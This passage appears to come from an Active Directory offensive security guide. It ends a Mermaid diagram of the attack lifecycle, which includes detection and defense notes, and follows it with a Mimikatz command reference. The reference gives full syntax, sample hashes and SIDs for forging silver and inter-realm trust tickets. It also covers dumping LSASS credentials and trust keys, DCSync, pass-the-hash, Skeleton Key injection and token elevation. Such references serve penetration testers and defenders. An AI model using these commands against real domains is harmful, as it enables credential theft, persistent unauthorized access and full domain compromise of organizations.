        Persist --> P1[Credential-Based:<br/>Multiple DA accounts<br/>Service account access<br/>KRBTGT hash]
        Persist --> P2[Ticket-Based:<br/>Golden Tickets<br/>Silver Tickets<br/>Diamond Tickets]
        Persist --> P3[Certificate-Based:<br/>Forged certificates<br/>CA private key<br/>Template backdoors]
        Persist --> P4[Backdoor-Based:<br/>Skeleton Key<br/>DSRM abuse<br/>Malicious SPN]
        Persist --> P5[ACL-Based:<br/>AdminSDHolder mod<br/>DCSync rights grant<br/>GPO delegation]
        
        P1 & P2 & P3 & P4 & P5 --> Multiple[Multiple Persistence Methods]
    end
    
    Multiple --> Objective[Mission Objectives]
    
    subgraph Phase7["Phase 7: Objective Completion"]
        Objective --> O1[Data Exfiltration:<br/>NTDS.dit extraction<br/>Sensitive file theft<br/>Email archive download]
        Objective --> O2[Ransomware:<br/>Shadow copy deletion<br/>File encryption<br/>Backup destruction]
        Objective --> O3[Long-Term Access:<br/>Maintain presence<br/>Monitor communications<br/>Pivot to other networks]
        Objective --> O4[Destruction:<br/>Account deletion<br/>System corruption<br/>Evidence removal]
    end
    
    TimelineNote[TYPICAL TIMELINE:<br/>Days 1-3: Initial access & enumeration<br/>Days 4-7: Exploitation & lateral movement<br/>Days 8-14: Privilege escalation & persistence<br/>Days 15+: Objective completion & covering tracks]
    
    DetectNote[KEY DETECTION POINTS:<br/>Initial Access: Unusual logons, failed auth attempts<br/>Enumeration: LDAP queries, BloodHound signatures<br/>Exploitation: Event 4769, certificate requests<br/>Lateral Movement: Event 4624, unusual service creation<br/>Persistence: ACL modifications, krbtgt access]
    
    PreventNote[DEFENSE-IN-DEPTH:<br/>Network: Segmentation, SMB signing, LDAP signing<br/>Identity: MFA everywhere, LAPS deployment<br/>Endpoint: EDR deployment, LSA protection<br/>Monitoring: Event log aggregation, anomaly detection<br/>Hardening: Disable LLMNR/NBT-NS, audit ACLs regularly]
    
    style TimelineNote fill:#e6ffe6
    style DetectNote fill:#ffe6e6
    style PreventNote fill:#f0f0ff
    
    style DA fill:#ff6666
    style Multiple fill:#ff9999
    style Objective fill:#ffcccc
```

*Figure: Complete Active Directory attack lifecycle from reconnaissance through objective completion with detection and prevention strategies*

---

## APPENDIX A: MIMIKATZ COMMAND REFERENCE

### Most Popular Mimikatz Commands:
Here are just some of the most popular Mimikatz command and related functionality.
The **DPAPI Mimikatz module** provides capability to extract Windows stored (and protected) credential data using DPAPI.  DPAPI is the official Windows method to protect (encrypt) local data (usually passwords).
The **CRYPTO Mimikatz module** provides advanced capability to interface with Windows cryptographic functions (CryptoAPI)
The **KERBEROS Mimikatz module** is used to interface with the official Microsoft Kerberos API. No special rights are required for the commands in this module.
The **LSADUMP Mimikatz Module** interacts with the Windows Local Security Authority (LSA) to extract credentials. Most of these commands require either debug rights (privlege::debug) or local System. By default, the Administrators group has Debug rights. Debug still has to be "activated" by running "privilege::debug".
The **Mimikatz PROCESS** module provides the ability to gather data on processes and interact with processes. i.e List Running Processes, Export and Import Processes
The **SEKURLSA Mimikatz** module interacts with protected memory. This module extracts passwords, keys, pin codes, tickets from the memory of lsass (Local Security Authority Subsystem Service). In order to interact with LSASS, the Mimikatz process requires appropriate rights:  
Administrator, to get debug privilege via "PRIVILEGE::Debug"
SYSTEM rights ("TOKEN::elevate")
However, running against a dumped LSASS process file (i.e. LSASS.dmp), elevated rights are not required.
The Mimikatz Token module enables Mimikatz to interact with Windows authentication tokens, including grabbing and impersonating existing tokens


    CRYPTO::Certificates – list/export certificates
    KERBEROS::Golden – create golden/silver/trust tickets 
The capability of this command is based on the password hash type retrieved.
Type 	Requirement 	Scope
Golden 	KRBTGT hash 	Domain/Forest
Silver 	Service hash 	Service
Trust 	Trust hash 	Domain/Forest -> Domain/Forest

Golden && Silver Ticket Default Groups:
    Domain Users SID: S-1-5-21<DOMAINID>-513
    Domain Admins SID: S-1-5-21<DOMAINID>-512
    Schema Admins SID: S-1-5-21<DOMAINID>-518
    Enterprise Admins SID: S-1-5-21<DOMAINID>-519  (this is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights)
    Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520
The account with RID 502 is the KRBTGT account and the account with RID 500 is the default administrator for the domain.

### Golden Ticket
A **Golden Ticket** is a TGT using the KRBTGT NTLM password hash to encrypt and sign. /krbtgt:parameter
A Golden Ticket (GT) can be created to impersonate any user (real or imagined) in the domain as a member of any group in the domain (providing a virtually unlimited amount of rights) to any and every resource in the domain. Since the Golden Ticket is an authentication ticket (TGT described below), its scope is the entire domain (and the AD forest by leveraging SID History) since the TGT is used to get service tickets (TGS) used to access resources. The Golden Ticket (TGT) contains user group membership information (PAC) and is signed and encrypted using the domain's Kerberos service account (KRBTGT) which can only be opened and read by the KRBTGT account. To summarize, once an attacker gets access to the KRBTGT password hash, they can create Golden Tickets (TGT) that provide access to anything in AD at any time.

### Silver Ticket
A **Silver Ticket** is a TGS (similar to TGT in format) using the target service account's NTLM password hash to encrypt and sign —> /rc4:Parameter.
The Mimikatz command to create a silver ticket is "kerberos::golden" 
Example Mimikatz Command to Create a Silver Ticket:
The following Mimikatz command creates a Silver Ticket for the CIFS service on the server adsmswin2k8r2.lab.adsecurity.org. In order for this Silver Ticket to be successfully created, the AD computer account password hash for adsmswin2k8r2.lab.adsecurity.org needs to be discovered, either from an AD domain dump or by running Mimikatz on the local system as shown above (Mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit). The NTLM password hash is used with the /rc4 paramteer. The service SPN - Comprehensive Reference type also needs to be identified in the /service parameter . Finally, the target computer's fully-qualified domain name needs to be provided in the /target parameter. Don't forget the domain SID in the /sid parameter.
Syntax: "kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt" exit

### Trust Ticket
Once the Active Directory Trust password hash is determined (Mimikatz "privilege::debug" "lsadump::trust /patch" exit), a trust ticket can be generated. 
Forging Internal AD Forest Trust Tickets
Step 1: Dumping trust passwords (trust keys)
Current Mimikatz versions can extract the trust keys (passwords).
*  Mimikatz "privilege::debug" "lsadump::trust /patch" exit
Step 2: Create a forged trust ticket (inter-realm TGT) using Mimikatz
Forge the trust ticket which states the ticket holder is an Enterprise Admin in the AD Forest. This enables full administrative access from a child domain to the parent domain. Note that this account doesn't have to exist anywhere as it is effectively a Golden Ticket across the trust.
Syntax: "Kerberos::golden /domain:child.lab.adsecurity.org /sid:S-1-5-21-3677078698-724690114-1972670770 /sids:S-1-5-21-1581655573-3923512380-696647894-519 /rc4:49ed1653275f78846ff06de1a02386fd /user:DarthVader /service:krbtgt /target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi"
Note: Using the /sids parameter will create a trust ticket for the target AD domain that says the holder of the Ticket is an Enterprise Admin specified by 519 in SIDs
Step 3: Use the Trust Ticket file created in Step 2 to get a TGS for the targeted service in the destination domain. Save the TGS to a file.
The resulting TGS provides EA access to the parent (root) domain's Domain Controller by targeting the CIFS service in this example (but it could target any).
Step 4: Inject the TGS file created in Step 3 and then access the targeted service with the spoofed rights.

### Mimikatz Golden && Silver Ticket && Trust Command Required Parameters:
/krbtgt – NTLM password hash for the domain KDC service account (KRBTGT). Used to encrypt and sign the TGT. 
/rc4 – the NTLM hash for the service (computer account or user account)
    /domain – the fully qualified domain name. In this example: "lab.adsecurity.org".
    /sid – the SID of the domain. In this example: "S-1-5-21-1473643419-774954089-2222329127".
    /sids – Additional SIDs for accounts/groups in the AD forest with rights you want the ticket to spoof. Typically, this will be the Enterprise Admins group for the root domain  "S-1-5-21-1473643419-774954089-5872329127-519". This parameter adds the provided SIDs to the SID History parameter.
    /user – username to impersonate
    /groups (optional) – group RIDs the user is a member of (the first is the primary group) default: 513,512,520,518,519 for the well-known Administrator's groups (listed below).
    /ticket (optional) – provide a path and name for saving the forged ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.
    /ptt – as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use.
    /id (optional) – user RID. Mimikatz default is 500 (the default Administrator account RID).
    /startoffset (optional) – the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.
    /endin (optional) – ticket lifetime. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).
    /renewmax (optional) – maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).
    /aes128 – the AES128 key
    /aes256 – the AES256 key
**Silver Ticket Required Parameters:**
    /target – target server's (in FQDN) where the service is running
    /service – the kerberos service running on the target server. This parameter is Service Principal Name SPN->Active Directory Service Principal Names (SPNs) Descriptions class (or type) such as cifs, http, mssql.
    /rc4 – the NTLM hash for the service (computer account or user account)
**Trust Ticket Specific Required Parameters:**
    /target – the target domain's FQDN.
    /service – the kerberos service running in the target domain (krbtgt).
    /rc4 – the NTLM hash for the service kerberos service account (krbtgt hash).
    /ticket – provide a path and name for saving the forged ticket file to for later use or use 
    /ptt to immediately inject the golden ticket into memory for use.

*KERBEROS::List* – List all user tickets (TGT and TGS) in user memory in Heimdall cache. No special privileges required since it only displays the current user's tickets. Similar to functionality of "klist". Can be specified with a flag /export:file -> to export user ticket to files parameter
*KERBEROS::PTT* – pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust) After a Kerberos ticket is found, it can be copied to another system and passed into the current session effectively simulating a logon without any communication with the Domain Controller. No special rights required. Similar to SEKURLSA::PTH (Pass-The-Hash).
    /filename – the ticket's filename (can be multiple)
    /diretory – a directory path, all .kirbi files inside will be injected.
*KERBEROS::Purge* – purge all Kerberos tickets
Similar to functionality of "klist purge". Run this command before passing tickets (PTC, PTT, etc) to ensure the correct user context is used.
*KERBEROS::TGT* – get current TGT for current user.

*LSADUMP::DCSync* – ask a DC to synchronize an object by Impersonating a Domain Controller and requests account password data from targeted DC. No need to run code on DC. Requires Membership in Domain Administrator(s), Entreprise Admins, Custom delegation, as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers(RODC) are not only allowed to pull password data for users by default.
The exploit method prior to DCSync was to run Mimikatz or Invoke-Mimikatz on a Domain Controller(Target Machine) to get the KRBTGT password hash to create Golden Tickets. With Mimikatz's DCSync and the appropriate rights, the attacker can pull the password hash, as well as previous password hashes, from a Domain Controller "over the network" without requiring interactive logon or copying off the Active Directory database file (ntds.dit), more stealthy, leaves no trace on Disk or Memory.
*How DCSync works:*
    Discovers Domain Controller in the specified domain name.
    Requests the Domain Controller replicate the user credentials via GetNCChanges (leveraging Directory Replication Service (DRS) Remote Protocol)
*DCSync Options:*
    /all – DCSync pull data for the entire domain.
    /user – user id or SID of the user you want to pull the data for.
    /domain (optional) – FQDN of the Active Directory domain. Mimikatz will discover a DC in the domain to connect to. If this parameter is not provided, Mimikatz defaults to the current domain.
    /csv – export to csv
    /dc (optional) – Specify the Domain Controller you want DCSync to connect to and gather data.

*LSADUMP::LSA* – Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: "/name:krbtgt"
Requires System or Debug rights.

    /inject – Inject LSASS to extract credentials
    /name – account name for target user account
    /id – RID for target user account
    /patch – patch LSASS.

LSADUMP::SAM – get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.
LSADUMP::Trust – Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest).
MISC::AddSid – Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016.
MISC::MemSSP – Inject a malicious Windows SSP to log locally authenticated credentials.
MISC::Skeleton – Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a "master password" (aka Skeleton Keys) as well as their usual password.
PRIVILEGE::Backup – get backup privilege/rights. Requires Debug rights.
PRIVILEGE::Debug – get debug rights (this or Local System rights is required for many Mimikatz commands).
By default, the Administrators group has Debug rights. Debug still has to be "activated" by running "privilege::debug".
The debug privilege allows someone to debug a process that they wouldn't otherwise have access to. For example, a process running as a user with the debug privilege enabled on its token can debug a service running as local system. ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061 means that the required privilege is not held by the client (mostly you're not an administrator :smirk:)

SEKURLSA::Ekeys – list Kerberos encryption keys
SEKURLSA::Credman - List Credential Manager 
SEKURLSA::Kerberos – List Kerberos credentials for all authenticated users (including services and computer account)
SEKURLSA::Krbtgt – get Domain Kerberos service account (KRBTGT)password data{krbtgt hash}
SEKURLSA::LogonPasswords – lists all available provider credentials. This usually shows recently logged on user and computer credentials.
Dumps password data in LSASS for currently logged on (or recently logged on) accounts as well as services running under the context of user credentials.
Account passwords are stored in memory in a reversible manner. If they are in memory (prior to Windows 8.1/Windows Server 2012 R2 they were), they are displayed. Windows 8.1/Windows Server 2012 R2 doesn't store the account password in this manner in most cases. KB2871997 "back-ports" this security capability to  Windows 7, Windows 8, Windows Server 2008R2, and Windows Server 2012, though the computer needs additional configuration after applying KB2871997. Services running with account credentials are also dumped using this command. Note that only services that are running (credentials in memory) can be dumped in this manner. Requires administrator access (with debug rights) or Local SYSTEM rights

**SEKURLSA::Pth –> Pass-the-Hash(PTH) and Over-Pass-the-Hash-oPTH(Pass-the-Key)** 
Mimikatz can perform the well-known operation 'Pass-The-Hash' to run a process under another credentials with NTLM hash of the user's password, instead of its real password. For this, it starts a process with a fake identity, then replaces fake information (NTLM hash of the fake password) with real information (NTLM hash of the real password).
    /user – the username you want to impersonate, keep in mind that Administrator is not the only name for this well-known account.
    /domain – the fully qualified domain name – without domain or in case of local user/admin, use computer or server name, workgroup or whatever.
    /rc4 or /ntlm – optional – the RC4 key / NTLM hash of the user's password.
    /run – optional – the command line to run – default is: cmd to have a shell.

**SEKURLSA::Tickets** – Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer's AD computer account.
Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).
    /export – optional – tickets are exported in .kirbi files. They start with user's LUID 
Similar to credential dumping from LSASS, using the sekurlsa module, an attacker can get all Kerberos ticket data in memory on a system, including those belonging to an admin or service.
This is extremely useful if an attacker has compromised a web server configured for Kerberos delegation that users access with a backend SQL server. This enables an attacker to capture and reuse all user tickets in memory on that server.
The "kerberos::tickets" mimikatz command dumps the current logged-on user's Kerberos tickets and does not require elevated rights. Leveraging the sekurlsa module's capability to read from protected memory (LSASS), all Kerberos tickets on the system can be dumped.
Command:  mimikatz sekurlsa::tickets exit
    Dumps all authenticated Kerberos tickets on a system.
    Requires administrator access (with debug) or Local SYSTEM rights

**SEKURLSA::Minidump** – switch to LSASS minidump process context
There are several different ways to dump LSASS:  procdump, PowerShell, Task Manager, etc. Note that Minidumps need to be read using the same platform it was dumped from NT5 Win32 or NT5x64 or NT6 Win32 or NT6 x64.
    TOKEN::List – list all tokens of the system
    TOKEN::Elevate – impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box using the Windows API
    TOKEN::Elevate /domainadmin – impersonate a token with Domain Admin credentials. TOKEN::Revert – revert to process token

---